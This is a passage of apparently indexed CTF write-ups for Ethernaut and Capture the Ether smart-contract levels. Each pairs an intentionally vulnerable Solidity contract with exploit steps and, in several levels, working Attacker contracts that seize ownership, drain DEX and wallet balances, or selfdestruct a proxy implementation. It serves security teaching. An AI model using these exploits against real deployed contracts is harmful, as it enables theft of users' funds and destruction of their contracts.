function!?</p>"},{"location":"1.%20Ethernaut/16.%20Preservation/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\n    address public timeZone1Library;\naddress public timeZone2Library;\naddress public owner; \nuint storedTime;\n\nfunction attack(Preservation preservation) external {\n        preservation.setFirstTime(uint256(uint160(address(this)))); //set the value of timeZone1Library to address(this)\npreservation.setFirstTime(uint256(uint160(msg.sender))); // call setFristTime from preservation again to execute setTime inside this contract\nrequire(preservation.owner() == msg.sender, \"hack failed\");\n}\n\n    function setTime(uint _time) public {\n        owner = address(uint160(_time));\n}    \n}\n</code></pre>"},{"location":"1.%20Ethernaut/17.%20Recovery/","title":"Recovery","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Recovery {\n\n//generate tokens\nfunction generateToken(string memory _name, uint256 _initialSupply) public {\nnew SimpleToken(_name, msg.sender, _initialSupply);\n\n}\n}\n\ncontract SimpleToken {\n\nstring public name;\nmapping (address =&gt; uint) public balances;\n\n// constructor\nconstructor(string memory _name, address _creator, uint256 _initialSupply) {\nname = _name;\nbalances[_creator] = _initialSupply;\n}\n\n// collect ether in return for tokens\nreceive() external payable {\nbalances[msg.sender] = msg.value * 10;\n}\n\n// allow transfers of tokens\nfunction transfer(address _to, uint _amount) public { require(balances[msg.sender] &gt;= _amount);\nbalances[msg.sender] = balances[msg.sender] - _amount;\nbalances[_to] = _amount;\n}\n\n// clean up after ourselves\nfunction destroy(address payable _to) public {\nselfdestruct(_to);\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/17.%20Recovery/#goal","title":"Goal","text":"<p>Recover (or remove) the 0.001 ether from the lost contract address (the Simple Token contract)</p>"},{"location":"1.%20Ethernaut/17.%20Recovery/#exploit","title":"Exploit","text":"<p>This CTF requires onchain transaction debugging. After we deploy the contract we can search for the transaction that created the insance of SimpleCoin (the one transaction that sends 0.001 ether).</p> <p>After we find the address of the contract, we can use Remix to load the SimpleCoin contract at the given address and call the destroy(_to) function, with our address as argument for _to parameter.</p> <p>Inside destroy(), selfdestruct() function will be called on the contract, and send the 0.001 ether to our account.</p>"},{"location":"1.%20Ethernaut/20.%20Denial/","title":"Denial","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Denial {\n\naddress public partner; // withdrawal partner - pay the gas, split the withdraw\naddress public constant owner = address(0xA9E);\nuint timeLastWithdrawn;\nmapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances\n\nfunction setWithdrawPartner(address _partner) public {\npartner = _partner;\n}\n\n// withdraw 1% to recipient and 1% to owner\nfunction withdraw() public {\nuint amountToSend = address(this).balance / 100;\n// perform a call without checking return\n// The recipient can revert, the owner will still get their share\npartner.call{value:amountToSend}(\"\");\npayable(owner).transfer(amountToSend);\n// keep track of last withdrawal time\ntimeLastWithdrawn = block.timestamp;\nwithdrawPartnerBalances[partner] +=  amountToSend;\n}\n\n// allow deposit of funds\nreceive() external payable {}\n\n// convenience function\nfunction contractBalance() public view returns (uint) {\nreturn address(this).balance;\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/20.%20Denial/#goal","title":"Goal","text":"<p>Deny the owner from withdrawing funds when they call withdraw()</p>"},{"location":"1.%20Ethernaut/20.%20Denial/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>Within the Attacker contract, we can make reentrant call to the withdraw() function up until the balance of ether in the Denial contract is greater than 0. This will cause the amountToSend variable to become 0, because of the following division:</p> <pre><code>uint amountToSend = address(this).balance / 100;\n</code></pre> <p>while the contract still holds small amount of ETH.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instance from the Denial contract inside the Attacker contract</li> <li>in the constructor of the Attacker contract, we need to set the Attacker contract as partner</li> <li>in the receive function of the Attacker we need to make reentrant call to the withdraw() function of the Denial contract, as long as the balance of ETH in Denial is greater than 0.</li> <li>we need to call the withdraw() function inside Denial contract</li> </ol>"},{"location":"1.%20Ethernaut/20.%20Denial/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\nDenial private denial;\nconstructor(Denial _denial) {\ndenial = Denial(_denial);\ndenial.setWithdrawPartner(address(this));\n}\n\nreceive() external payable {\nwhile(address(denial).balance &gt; 0) {\ndenial.withdraw();\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/21.%20Shop/","title":"Shop","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Buyer {\nfunction price() external view returns (uint);\n}\n\ncontract Shop {\nuint public price = 100;\nbool public isSold;\n\nfunction buy() public {\nBuyer _buyer = Buyer(msg.sender);\n\nif (_buyer.price() &gt;= price &amp;&amp; !isSold) {\nisSold = true;\nprice = _buyer.price();\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/21.%20Shop/#goal","title":"Goal","text":"<p>Buy the item from the shop for less than 100, make the value of the price variable inside Shop to be less than 100</p>"},{"location":"1.%20Ethernaut/21.%20Shop/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>This CTF is somewhat similar to the Elevator one.</p> <p>The Attacker contract should implement the price() function from the Buyer interface and return different value the second time this function is called.</p> <p>This time we won't depend on additional variable (we used count in the Elevator CTF), but we will hack our way into the isSold variable which is set to false by default.</p> <p>If we take a look in the if statement, when the buy() function is called</p> <pre><code>  if (_buyer.price() &gt;= price &amp;&amp; !isSold) {\n    isSold = true;\nprice = _buyer.price();\n}\n</code></pre> <p>when price() function is called for the first time from the Attacker contract, it should return value greater than 100, and inside the if, when the same function is called second time, it should return value less than 100, and therefore set the value of the price variable inside Shop to that value.</p> <p>What we need to figure out is how to track wether price() is called for the first or second time.</p> <p>This can be done with the use of the isSold variable. When we call price() function for the first time we know that isSold is false by default and we can return some value like 130 for example from our price function.</p> <p>Before calling price() again, isSold variable is set to true, one line before, so inside price() we can check the value of the isSold variable, and if this value is true we return value less than 100</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instance from the Shop contract inside the Attacker contract</li> <li>create buyCheaper() external function inside Attacker, and call the buy() function inside Shop within</li> <li> <p>impelment/create price() function from Buyer interface, and inside  <ul> <li>if isSold variable from Shop contract is false, return value equal or greater than 100</li> <li>if isSold variable from Shop contract is true, return value less than 100</li> </ul></p> </li> <li> <p>call buyCheaper() function from our account</p> </li> </ol>"},{"location":"1.%20Ethernaut/21.%20Shop/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\nShop private immutable shop;\n\nconstructor(address _shop) {\nshop = Shop(_shop);\n}\n\nfunction buyCheaper() external {\nshop.buy();\n}\n\nfunction price() external view returns (uint) {\nif(!shop.isSold()) {\nreturn 130;\n} else return 30;\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/23.%20Dex%20Two/","title":"Dex Two","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";\nimport 'openzeppelin-contracts-08/access/Ownable.sol';\n\ncontract DexTwo is Ownable {\n  address public token1;\n  address public token2;\n  constructor() {}\n\n  function setTokens(address _token1, address _token2) public onlyOwner {\n    token1 = _token1;\n    token2 = _token2;\n  }\n\n  function add_liquidity(address token_address, uint amount) public onlyOwner {\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  }\n\n  function swap(address from, address to, uint amount) public {\n    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, \"Not enough to swap\");\n    uint swapAmount = getSwapAmount(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swapAmount);\n    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);\n  } \n\n  function getSwapAmount(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  }\n\n  function approve(address spender, uint amount) public {\n    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);\n    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);\n  }\n\n  function balanceOf(address token, address account) public view returns (uint){\n    return IERC20(token).balanceOf(account);\n  }\n}\n\ncontract SwappableTokenTwo is ERC20 {\n  address private _dex;\n  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n        _dex = dexInstance;\n  }\n\n  function approve(address owner, address spender, uint256 amount) public {\n    require(owner != _dex, \"InvalidApprover\");\n    super._approve(owner, spender, amount);\n  }\n}\n</code></pre>"},{"location":"1.%20Ethernaut/23.%20Dex%20Two/#goal","title":"Goal","text":"<p>Drain all balances of token1 and token2 from the DexTwo contract.</p>"},{"location":"1.%20Ethernaut/23.%20Dex%20Two/#exploit","title":"Exploit","text":"<p>The exploitable part of the code is located in the swap function, the issue is that we don't check if the from and to address are equal to token1 and token2 address correspondently.</p> <p>To exploit the contract we need to:</p> <ol> <li>create new two new tokens (ex. TKN3, TKN4) that will be instances from SwappableTokenTwo</li> <li>both of these tokens should have total supply of 200 tokens, all of which will be minted to our account address</li> <li>we will approve the DexTwo contract to be able to spend 100 TKN3 tokens on our behalf</li> <li>we will transfer 100 TKN3 tokens to DexTwo contract</li> <li> <p>we will call swap() function from DexTwo contract with the following arguments:  <ul> <li>TKN3 address will be used as argument for from parameter</li> <li>TKN1 address will be used as argument for to parameter</li> <li>the amount that we will send will be 100 TKN3 tokens (100000000000000000000)</li> </ul></p> </li> <li> <p>we will approve the DexTwo contract to be able to spend 100 TKN4 tokens on our behalf</p> </li> <li>we will transfer 100 TKN4 tokens to DexTwo contract</li> <li>we will call swap() function from DexTwo contract with the following arguments:  <ul> <li>TKN4 address will be used as argument for from parameter</li> <li>TKN2 address will be used as argument for to parameter</li> <li>the amount that we will send will be 100 TKN4 tokens (100000000000000000000)</li> </ul> </li> </ol>"},{"location":"1.%20Ethernaut/24.%20Puzzle%20Wallet/","title":"Puzzle Wallet","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma experimental ABIEncoderV2;\n\nimport \"../helpers/UpgradeableProxy-08.sol\";\n\ncontract PuzzleProxy is UpgradeableProxy {\n    address public pendingAdmin;\n    address public admin;\n\n    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {\n        admin = _admin;\n    }\n\n    modifier onlyAdmin {\n      require(msg.sender == admin, \"Caller is not the admin\");\n      _;\n    }\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {\n        require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");\n        admin = pendingAdmin;\n    }\n\n    function upgradeTo(address _newImplementation) external onlyAdmin {\n        _upgradeTo(_newImplementation);\n    }\n}\n\ncontract PuzzleWallet {\n    address public owner;\n    uint256 public maxBalance;\n    mapping(address =&gt; bool) public whitelisted;\n    mapping(address =&gt; uint256) public balances;\n\n    function init(uint256 _maxBalance) public {\n        require(maxBalance == 0, \"Already initialized\");\n        maxBalance = _maxBalance;\n        owner = msg.sender;\n    }\n\n    modifier onlyWhitelisted {\n        require(whitelisted[msg.sender], \"Not whitelisted\");\n        _;\n    }\n\n    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      maxBalance = _maxBalance;\n    }\n\n    function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        whitelisted[addr] = true;\n    }\n\n    function deposit() external payable onlyWhitelisted {\n      require(address(this).balance &lt;= maxBalance, \"Max balance reached\");\n      balances[msg.sender] += msg.value;\n    }\n\n    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {\n        require(balances[msg.sender] &gt;= value, \"Insufficient balance\");\n        balances[msg.sender] -= value;\n        (bool success, ) = to.call{ value: value }(data);\n        require(success, \"Execution failed\");\n    }\n\n    function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n        bool depositCalled = false;\n        for (uint256 i = 0; i &lt; data.length; i++) {\n            bytes memory _data = data[i];\n            bytes4 selector;\n            assembly {\n                selector := mload(add(_data, 32))\n            }\n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n</code></pre>"},{"location":"1.%20Ethernaut/24.%20Puzzle%20Wallet/#goal","title":"Goal","text":"<p>The goal of this ctf is to hijack the <code>PuzzleWallet</code> by becoming admin of the <code>PuzzleProxy</code>.</p>"},{"location":"1.%20Ethernaut/24.%20Puzzle%20Wallet/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p> <p><code>PuzzleWallet</code> is an upgradeable contract which is following the Proxy Upgrade Pattern pattern and can be upgraded by calling the <code>upgradeTo</code> function from <code>PuzzleProxy</code>.</p> <p>When dealing with upgradeable proxies one must be aware that the storage layout of the proxy contract and the implementation (logic) contract must be the same, and this is where we can start looking for possible exploits.</p> <p>If we compare the storage variables in <code>PuzzleProxy</code> (proxy contract) and <code>PuzzleWallet</code> (implementation contract) we can notice that <code>pendingAdmin</code> variable inside <code>PuzzleProxy</code> corresponds to <code>owner</code> inside <code>PuzzleWallet</code> and <code>admin</code> variable corresponds to <code>maxBalance</code>. This means if we can find a way to update <code>maxBalance</code> variable we can update the admin of <code>PuzzleProxy</code>.</p> <p>After digging into the <code>PuzzleWallet</code> contract we can notice that the only way to update <code>maxBalance</code> is through the <code>setMaxBalance</code> function, however there are two requirements that we need to satisfy, first one is we need to be whitelisted, second one is the balance of ether in the <code>PuzzleWalet</code> should be equal to 0.</p> <p>Let's start with passing the first one. In order to get whitelisted we need to call <code>addToWhitelist</code> function inside <code>PuzzleWallet</code>, but there is additional requirement here, the caller of <code>addToWhitelist</code> must be the <code>owner</code>. Remember when we said that <code>owner</code> state variable corresponds to <code>pendingAdmin</code> variable, this means if we find a way to update the <code>pendingAdmin</code> variable, beacause of the nature of Proxy Upgrade Pattern and <code>delegatecall</code>, <code>owner</code> variable will also get updated and we can set the <code>Attacker</code> contract as the <code>owner</code>. To update <code>pendingAdmin</code>, we will call <code>proposeNewAdmin</code> function inside <code>PuzzleProxy</code>, this will update <code>owner</code> inside <code>PuzzleWallet</code>, and therefore we can call <code>addToWhitelist</code> and add the <code>Attacker</code> contract address in the <code>whitelisted</code> mapping.</p> <p>It means we are now whitelisted and our next task is to find a way how to drain the ETH balance from <code>PuzzleWallet</code>.</p> <p>The only function that is sending ETH away from <code>PuzleWallet</code> is <code>execute</code>, but in order to call this function successfully we must have first deposited ETH in <code>PuzzleWallet</code>, the contract is tracking this using the <code>balances</code> mapping. Given that this contract already has a balance of 0.001 ETH locked in it (we can check this by loading the <code>PuzzleWallet</code> contract at address inside Remix, we can find this address in the Ethernaut console), we must fund a way to depoist 0.001 ETH but update the <code>balances</code> mapping to show as if we have deposited 0.002 (after depositing 0.001 ETH, <code>PuzzleWallet</code> contract balance will become 0.002 ETH, and we must take all of this ETH from the contract).</p> <p>Something that we must have in mind is that when using <code>delegatecall</code>, msg.value and msg.sender are context preserving, meaning they will have the same value as in the caller contract.</p> <p>In order to do so, we will make use of the <code>deposit</code> &amp; <code>multicall</code> functions. First we can see that inside <code>multicall</code> we can pass a bytes array <code>data</code> which is later used when <code>delegatecall</code> low level call is performed inside <code>multicall</code>. When <code>performing</code> a <code>delegatecall</code> we can notice that the <code>PuzzleWallet</code> contract is actually calling \"iteslf\":</p> <p><code>(bool success, ) = address(this).delegatecall(data[i]);</code></p> <p>What we can do is prepare the <code>data</code> argument, in a way that when we call <code>multicall</code>, the first parameter from the <code>data</code> array will cause a <code>delegatecall</code> to the <code>deposit</code> function of the same (<code>PuzzleWallet</code>) contract , and the second paramter from the <code>data</code> array will cause a <code>delegatecall</code> to the <code>multicall</code> function which will then call the <code>deposit</code> function inside <code>PuzzleWallet</code> (we must <code>delegatecall</code> to <code>multicall</code> frist and to <code>deposit</code> directly because of the following check: <code>if (selector == this.deposit.selector)</code>).</p> <p>After passing the two requirements at the end we are only left to call <code>setMaxBalance</code> function from <code>PuzzleWallet</code> and send the uint256 representation of our EOA address <code>uint256(uint160(someAddress))</code> as a function parameter.</p> <p>To exploit the contract we need to:</p> <ol> <li>create IPuzzleWallet interface and define all the functions that we are going to use from <code>PuzzleProxy</code> &amp; <code>PuzzleWallet</code></li> <li>create Attacker contract, passing the IPuzzleWallet interface object as a constructor parameter</li> <li>inside the constructor of the <code>Attacker</code> contract we will:  <ul> <li>call proposeNewAdmin() function from PuzzleProxy passing the address of the Attacker contract as an argument for the _newAdmin parameter</li> <li>call addToWhitelist() function from PuzzleWallet passing the address of the Attacker contract as an argument for the addr parameter</li> <li>prepare the data array that we will need to pass to the multicall function</li> <li>call multicall() function from PuzzleWallet passing the previously prepared data array as an argument for the data parameter and send 0.001 ETH as a value</li> <li>call execute() function from PuzzleWallet passing the address of the Attacker contract as an argument for the to parameter, 0.002 ETH as argument for the value parameter and empty string as argument for the data parameter</li> <li>call setMaxBalance() function from PuzzleWallet passing the uint256 representation of our EOA address</li> <li>check if the admin of PuzzleProxy contract is set to our account address</li> </ul> </li> </ol>"},{"location":"1.%20Ethernaut/24.%20Puzzle%20Wallet/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>interface IPuzzleWallet {\nfunction proposeNewAdmin(address _newAdmin) external;\nfunction addToWhitelist(address addr) external;\nfunction deposit() external payable;\nfunction multicall(bytes[] calldata data) external payable;\nfunction execute(address to, uint256 value, bytes calldata data) external payable;\nfunction setMaxBalance(uint256 _maxBalance) external;\nfunction admin() external view returns (address);\n}\n\ncontract Attacker {\nconstructor(IPuzzleWallet puzzleWallet) payable {\npuzzleWallet.proposeNewAdmin(address(this));\npuzzleWallet.addToWhitelist(address(this));\n\nbytes[] memory depositData = new bytes[](1);\ndepositData[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);\n\nbytes[] memory data = new bytes[](2);\ndata[0] = depositData[0];\ndata[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositData);\n\npuzzleWallet.multicall{value: 0.001 ether}(data);\npuzzleWallet.execute(address(this), 0.002 ether, \"\");\npuzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));\n\nrequire(puzzleWallet.admin() == msg.sender, \"attack failed\");\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/25.%20Motorbike/","title":"Motorbike","text":"<pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity &lt;0.7.0;\n\nimport \"openzeppelin-contracts-06/utils/Address.sol\";\nimport \"openzeppelin-contracts-06/proxy/Initializable.sol\";\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) public {\n        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success,) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`. \n    // Will run if no other function in the contract matches the call data\n    fallback () external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r_slot := slot\n        }\n    }\n}\n\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length &gt; 0) {\n            (bool success,) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n\n        AddressSlot storage r;\n        assembly {\n            r_slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n</code></pre>"},{"location":"1.%20Ethernaut/25.%20Motorbike/#goal","title":"Goal","text":"<p>The goal of this challenge is to <code>selfdestruc</code> the <code>Engine</code> contract.</p>"},{"location":"1.%20Ethernaut/25.%20Motorbike/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>Again the contracts of this challenge are following the Proxy Upgrade Pattern, more specifically the UUPS pattern. The proxy contract in our case <code>Motorbike</code> acts as a storage layer so any state modification in the implementation contract (in our case <code>Engin</code>) normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.</p> <p>Before we even start with the hack, we must first find the address of the <code>Engine</code> contract. One way to do that is after we deploy a new level instance, take note of the instance address using the web developer console on the Ethernaut page, after that using MetaMask we can open the transaction that created the level instance in a block explorer (Etherscan), when we are in the transaction details page we need to switch to the State tab and search for the contract instance address that we previously noted. We need to show the details of this address (Click to see more), and look for the value that is stored in the <code>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code> storage address. In here in the <code>After</code> field we will find the address of the <code>Engine</code> contract. Next is to remove all the unnecessary 0's from the address and load the <code>Engine</code> contract at this address inside Remix.</p> <p>The issue in this CTF is that the implementation contract <code>Engine</code> was left uninitialized, which means everyone can call the <code>initialize</code> function inside it and set <code>upgrader</code> and <code>horsePower</code> variables to the desired values.</p> <p>After the <code>upgrader</code> variable is set to hold the value of the <code>Attacker</code> contract address, we can call <code>upgradeToAndCall</code> function insde <code>Engine</code> and it will <code>delegatecall</code> to the <code>Attacker</code> contract calling the <code>selfdestruct</code> function inside it. Altthough the <code>selfdestruct</code> will be called inside <code>Attacker</code>, since we are delegating the call from the <code>Engine</code> contract it is the <code>Engine</code> contract that will be deleted.</p> <p>To exploit the contract we need to:</p> <ol> <li>create IEngine interface and define all the functions that we are going to use from <code>Engine</code></li> <li>create Attacker contract</li> <li> <p>create attack(IEngine engine) external function inside the Attacker contract, passing in the Engine contract as function argument, and inside this function we will:  <ul> <li>call initilize function from Engine in order to set the upgrader variable to the address of the Attacker contract</li> <li>call upgradeToAndCall function with the address of the Attacker contract as argument for newImplementation parameter and the abi encoded string of the kill function (inside which we'll call selfdestruct) as an argument for the data parameter</li> </ul></p> </li> <li> <p>create kill() function inside Attacker contract, and inside it call selfdestruct, because Engine contract will delegatecall to the Attacker contract calling this kill function, selfdestruct will cause the Engine contract to be deleted instead of the Attacker one.</p> </li> </ol>"},{"location":"1.%20Ethernaut/25.%20Motorbike/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>interface IEngine {\n    function initialize() external;\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;\n}\n\ncontract Attacker {\n    function attack(IEngine engine) external {\n        engine.initialize();\n        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));\n    }\n\n    function kill() public {\n        selfdestruct(payable(address(this)));\n    }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/01.%20Guess%20the%20number/","title":"Guess the number","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract GuessTheNumberChallenge {\n  uint8 answer = 42;\n\nfunction GuessTheNumberChallenge() public payable {\n    require(msg.value == 1 ether);\n}\n\n  function isComplete() public view returns (bool) {\n    return address(this).balance == 0;\n}\n\n  function guess(uint8 n) public payable {\n    require(msg.value == 1 ether);\n\nif (n == answer) {\n      msg.sender.transfer(2 ether);\n}\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/01.%20Guess%20the%20number/#goal","title":"Goal","text":"<p>Guess the number to win ETH</p>"},{"location":"2.%20Capture%20the%20Ether/01.%20Guess%20the%20number/#exploit","title":"Exploit","text":"<p>This is a simple excercise. One thing to have in mind while wokring with blockchains and smart contracts is that everything on the blockchain is public and accessible to anyone. Even though variables and functions can be named as private, this does not mean they can not be viewed by others.</p> <p>In our case we can guess the number directly from looking into the smart contract code, or by using blockchain explorer as Etherscan (we will need to take a look into the transaction in which the GuessTheNumberChallenge contract is deployed).</p> <p>The correct number is 42, so we just need to call guess(uint8 n) with 42 as argument for n.</p>"},{"location":"2.%20Capture%20the%20Ether/02.%20Guess%20the%20secret%20number/","title":"Guess the secret number","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract GuessTheSecretNumberChallenge {\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n\nfunction GuessTheSecretNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n}\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n}\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\nif (keccak256(n) == answerHash) {\n            msg.sender.transfer(2 ether);\n}\n    }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/02.%20Guess%20the%20secret%20number/#goal","title":"Goal","text":"<p>Guess the number to win ETH</p>"},{"location":"2.%20Capture%20the%20Ether/02.%20Guess%20the%20secret%20number/#exploit","title":"Exploit","text":"<p>This CTF is a bit tricker than the previus one (Guess the number).</p> <p>Instead of storing the number in the contract we are using hash of it, to be more precise it is keccak256 hash of the number.</p> <p>Guessing a hash of a number would be nearly impossible if we are working with numbers that can hold extremly large values (such as uint256).</p> <p>But in our case we can see inside guess(uint8 n) function, that the n parameter is of type uint8.</p> <p>What this means is that the minimum value uint8 variable can have is 0, and the maximum value is 2^8 - 1, which is 255.</p> <p>So we can brute-force, and calculate the keccak256 hashes for every number from 0 - 255 and get the correct number with the help of some external script.</p> <p>In our case the correct number is 170.</p>"},{"location":"2.%20Capture%20the%20Ether/03.%20Guess%20the%20random%20number/","title":"Guess the random number","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge {\n  uint8 answer;\n\nfunction GuessTheRandomNumberChallenge() public payable {\n    require(msg.value == 1 ether);\nanswer = uint8(keccak256(block.blockhash(block.number - 1), now));\n}\n\n  function isComplete() public view returns (bool) {\n    return address(this).balance == 0;\n}\n\n  function guess(uint8 n) public payable {\n    require(msg.value == 1 ether);\n\nif (n == answer) {\n      msg.sender.transfer(2 ether);\n}\n  }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/03.%20Guess%20the%20random%20number/#goal","title":"Goal","text":"<p>Guess the number to win and get all the ETH from the smart contract</p>"},{"location":"2.%20Capture%20the%20Ether/03.%20Guess%20the%20random%20number/#exploit","title":"Exploit","text":"<p>The way we can win this CTF is to look into the transaction that has deployed the GuessTheRandomNumberChallenge contract. For this we can use Etherscan.</p> <p>In Etherscan we can go to the \"State Changes\" part of the transaction and search for the state change that changes the contract ETH balance from 0 to 1.</p> <p>We check this change because the contract gets 1 Ether inside the constructor and here is also where the answer variable gets assigned.</p> <p>Here we can find the value of the answer variable.</p> <p></p>"},{"location":"2.%20Capture%20the%20Ether/04.%20Guess%20the%20new%20number/","title":"Guess the new number","text":"<pre><code>pragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge {\n    function GuessTheNewNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n}\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n}\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\nuint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\nif (n == answer) {\n            msg.sender.transfer(2 ether);\n}\n    }\n}\n</code></pre>"},{"location":"2.%20Capture%20the%20Ether/04.%20Guess%20the%20new%20number/#goal","title":"Goal","text":"<p>Guess the number to win and get all the ETH from the smart contract</p>"},{"location":"2.%20Capture%20the%20Ether/04.%20Guess%20the%20new%20number/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>From the contract we see that the answer is calulated in the following way:</p> <pre><code>  uint8 